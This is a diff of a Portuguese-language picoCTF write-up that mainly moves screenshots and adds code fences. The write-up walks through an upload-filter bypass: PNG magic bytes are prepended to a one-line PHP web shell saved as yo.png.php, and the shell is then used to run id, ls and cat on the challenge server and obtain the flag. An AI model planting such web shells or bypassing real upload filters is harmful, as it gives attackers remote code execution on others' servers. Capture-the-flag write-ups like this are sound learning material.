@@ -15,7 +15,7 @@ Abrimos a URL do desafio e identificamos uma funcionalidade de upload que aceita
 
 ![image](https://github.com/user-attachments/assets/1ad8aadb-93a2-428b-b7a2-7ae33bc847cc)
 
-Criamos um arquivo yo.php com uma simples payload PHP `(<?=\$_GET[0]`?>`)`.
+Criamos um arquivo yo.php com uma simples payload PHP ```(<?=\$_GET[0]`?>`)```.
 
 Tentamos enviá-lo, mas o servidor rejeitou, indicando que o nome do arquivo precisava conter .png.
 
@@ -24,36 +24,47 @@ Tentamos enviá-lo, mas o servidor rejeitou, indicando que o nome do arquivo pre
 Renomeamos o arquivo para yo.png.php e tentamos o upload novamente.
 O servidor aceitou o nome, mas ainda rejeitou o arquivo dizendo que não era um PNG válido.
 
+![image](https://github.com/user-attachments/assets/58157f2b-faf5-4fa4-8736-2362f4d855fd)
+
 Pegamos os bytes mágicos do PNG (89 50 4E 47 0D 0A 1A 0A).
 Criamos um arquivo base.png, abrimos em um editor hexadecimal e inserimos os bytes mágicos no início.
+
+![image](https://github.com/user-attachments/assets/192391de-0113-44a6-ab5e-cec08305a643)
+
 No final do arquivo, adicionamos a payload PHP (<?=\$_GET[0]`?>`).
 Renomeamos para yo.png.php e fizemos o upload novamente.
 
+![image](https://github.com/user-attachments/assets/5fc90973-f63b-44b4-93d2-7496179895dc)
+
 Testamos diretórios comuns (/uploads/, /files/, /images/) e encontramos nosso arquivo em:
 
+```https
 http://atlas.picoctf.net:62573/uploads/yo.png.php
+```
 
 Testamos a execução de código com ?0=id, confirmando o acesso
 
+```
 http://atlas.picoctf.net:62573/uploads/yo.png.php?0=id
+```
 
 Listamos arquivos no diretório
 
+```
 http://atlas.picoctf.net:62573/uploads/yo.png.php?0=ls ..
+```
 
 Encontramos GQ4DOOBVMMYGK.txt e lemos o conteúdo
 
+```
 http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
+```
 
-
-1
-![image](https://github.com/user-attachments/assets/58157f2b-faf5-4fa4-8736-2362f4d855fd)
+> Assim, obtemos a flag `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}` 
 
 2
 ![image](https://github.com/user-attachments/assets/3b878932-f653-47d5-bef0-978a6afaa22f)
 
-3
-![image](https://github.com/user-attachments/assets/192391de-0113-44a6-ab5e-cec08305a643)
 
 4
 ![image](https://github.com/user-attachments/assets/18837203-98d9-44d0-aac9-3c0bf62e7a3a)
@@ -61,8 +72,6 @@ http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
 5
 ![image](https://github.com/user-attachments/assets/23009445-c52c-47c7-a126-8084b6efd24d)
 
-6
-![image](https://github.com/user-attachments/assets/5fc90973-f63b-44b4-93d2-7496179895dc)
 
 7
 ![image](https://github.com/user-attachments/assets/c443c4ff-015d-44cc-b707-d0aad97d8398)
@@ -72,8 +81,4 @@ http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
 
 9
 ![image](https://github.com/user-attachments/assets/77bd82c3-e2cd-4150-a259-d26c06d14ac9)
-
-
-
-
-> Assim, obtemos a flag `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}`  
+ 
